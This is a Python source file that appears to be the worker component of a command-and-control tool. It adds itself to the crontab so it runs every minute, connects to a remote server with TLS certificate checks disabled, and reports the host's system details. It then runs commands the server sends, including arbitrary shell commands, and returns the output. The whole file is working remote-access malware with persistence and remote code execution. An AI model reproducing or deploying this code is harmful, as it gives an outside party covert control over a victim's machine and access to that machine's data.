import os
import sys
import subprocess
import platform
import socket
import ssl
import uuid
from datetime import datetime

from DataToObject.ServerCommand import ServerCommand
from DataToObject.WorkerResult import WorkerResult
from DataToObject.WorkerResultCommand import WorkerResultCommand
from Utils.ObjectSerialization import data_to_base64_json_encoded_bytes, bytes_to_object
from Utils.ReceiveAll import socket_receive_all
from Utils.Ping import ping

# ------------ GLOBAL INITS
socket.setdefaulttimeout(5)

pwd = os.path.dirname(os.path.abspath(__file__))

ssl_context = ssl.create_default_context()
ssl_context.load_verify_locations(os.path.join(pwd, '.ssh', 'rootCA.pem'))
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

version: str = "w1.0.0"
server_address: str = "localhost" if len(sys.argv) < 2 else sys.argv[1]
server_port: int = 55612 if len(sys.argv) < 3 else int(sys.argv[2])
identifier: str = str(uuid.uuid4()) if len(sys.argv) < 4 else sys.argv[3]


# ------------ FUNCTIONS
def init_crontab() -> None:
    global pwd, server_address, server_port, identifier
    cron_schedule = "* * * * *"
    cron_command = f"python3 {pwd}/worker.py {server_address} {server_port} {identifier}"

    try:
        crontab_list = subprocess.check_output(
            "crontab -l",
           shell=True,
           stderr=subprocess.PIPE
       ).decode('utf-8')
    except subprocess.CalledProcessError:
        crontab_list = ""

    if cron_command in crontab_list:
        return

    subprocess.run(
        f"echo '{crontab_list}\n{cron_schedule} {cron_command}' | crontab -",
        shell=True,
        check=True
    )

def get_infos() -> WorkerResult:
    global identifier, version

    data: WorkerResult = WorkerResult()

    data.identifier = identifier
    data.version = version
    data.created_at = datetime.now().strftime("%d/%m/%Y, %H:%M:%S")

    data.os_name = platform.system()
    data.os_version = platform.version()
    data.machine = platform.machine()
    data.python_version = platform.python_version()
    data.processor = platform.processor()

    print(data)

    return data

def command_ls(command: ServerCommand) -> any:
    return '\n'.join(os.listdir(os.path.abspath(command.data)))

def command_ping(command: ServerCommand) -> any:
    return ping(command.data)

def command_custom(command: ServerCommand) -> any:
    return subprocess.getoutput(command.data)

def handle_command(sock: socket.socket, command: ServerCommand) -> None:
    print('Executing ' + command.command)
    try:
        result = WorkerResultCommand()
        result.command = command.command
        result.data = command.data

        result_data = None
        if command.command == command.CMD_LS:
            result_data = command_ls(command)
        elif command.command == command.CMD_PING:
            result_data = command_ping(command)
        elif command.command == command.CMD_CUSTOM:
            result_data = command_custom(command)

        if result_data is not None:
            print(result_data)
            result.result = result_data
            to_send = data_to_base64_json_encoded_bytes(result)
            sock.send(to_send)
    except Exception as e:
        print('Error executing ' + command.command)
        print(e)

# ------------ PROGRAM
def main() -> None:
    global ssl_context, server_address, server_port

    init_crontab()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_socket = ssl_context.wrap_socket(sock)
    ssl_socket.connect((server_address, server_port))

    data = data_to_base64_json_encoded_bytes(get_infos())
    ssl_socket.send(data)
    print('Data sent !\n')

    try:
        data = socket_receive_all(ssl_socket)

        if data == b'':
            return

        print('Received command from server')
        command = bytes_to_object(data, ServerCommand)
        print('Deserialized: ' + str(command))
        handle_command(ssl_socket, command)
    except socket.timeout:
        pass
    except Exception as e:
        print(e)

    ssl_socket.close()

if __name__ == "__main__":
    main()
